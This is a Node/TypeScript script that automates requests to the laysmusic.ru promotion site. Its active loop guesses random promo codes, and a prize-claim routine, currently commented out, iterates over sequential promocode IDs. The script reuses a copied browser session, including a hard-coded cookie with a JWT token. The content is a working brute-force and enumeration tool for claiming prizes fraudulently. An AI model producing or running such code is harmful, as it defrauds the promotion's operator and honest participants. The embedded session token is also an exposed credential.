import {URLSearchParams} from "url";


(<any>global).fetch = require("node-fetch");
(<any>global).URLSearchParams = URLSearchParams;

(async() => {
  for (let i = 1; i <= 100; ++i) {
    // await laysGarant(i * 100);
    await lays(i);
  }
})();

async function laysGarant(value) {
  // const promoId = 10406519;
  const promoId = 10405761;

  for (let i = value; i <= value + 100; ++i) {
    let promo = promoId + i;
    let block = 'kassir_code';
    // let block = 'virtual_mobile_money_5p';
    // let block = 'mybook_code';
    const res = await fetch("https://laysmusic.ru/method/order_garant_prize/", {"credentials":"include","headers": getHeaders(),"referrer":"https://laysmusic.ru/","referrerPolicy":"no-referrer-when-downgrade","body":`promocode_id=${promo}&prize_slug=${block}`,"method":"POST","mode":"cors"});
    const json = await res.json();
    console.log(json.message);
  }
}

async function lays(i) {

  let code = "SC" + Math.random().toString(16).slice(2,8);
  // let code = "SCQ4NYNE";

  if (i % 3 === 0) {
    code = "SCQ4NYNE";
  }
  const headers = getHeaders();
  let check_code = await fetch("https://laysmusic.ru/method/check_code/", {"credentials":"include", headers,"referrer":"https://laysmusic.ru/","referrerPolicy":"no-referrer-when-downgrade","body":"code=" + code,"method":"POST","mode":"cors"});
  const json = await check_code.json();
  if (json.status !== "success") {
    return console.log(json);
  }

  await sleep(1000);

  let params = new URLSearchParams();
  params.append("task_id", json.task_id);

  let check_task = await fetch("https://laysmusic.ru/method/check_task/", {"credentials":"include", headers,"body": params,"method":"POST","mode":"cors"});
  const taskJson = await check_task.json();

  console.log(json.task_id, taskJson.message || taskJson);
}

export function sleep(time) {
  return new Promise(resolve => setTimeout(resolve, time));
}

function getHeaders() {
  return {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "Content-Length": "17",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    // "Cookie": "_ga=GA1.2.281817553.1554450418; _gid=GA1.2.1649451757.1554450418; _gat_UA-90926084-3=1; bp_user_guid=f2d64e6d-327a-4700-ac42-ca4c38764ee2",
    "Cookie": "_ga=GA1.2.888259108.1554456679; _gid=GA1.2.101893692.1554456679; bp_jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IjE1NTQ0NTY3MzcwMTAtTUlaSU5oZGtSRXgxNHg0VldFUk5icFRZQVpHMlk5QWwiLCJpYXQiOjE1NTQ0NTc4NTN9.aK5-g0zUhKkkFdLvb7WtYnDaSS8BrHj80KkzuIJnVX8; bp_user_guid=155ce3fc-879f-4889-860e-a1905647577c",
    "Host": "laysmusic.ru",
    "Origin": "https://laysmusic.ru",
    "Pragma": "no-cache",
    "Referer": "https://laysmusic.ru/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?F",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
  }
}
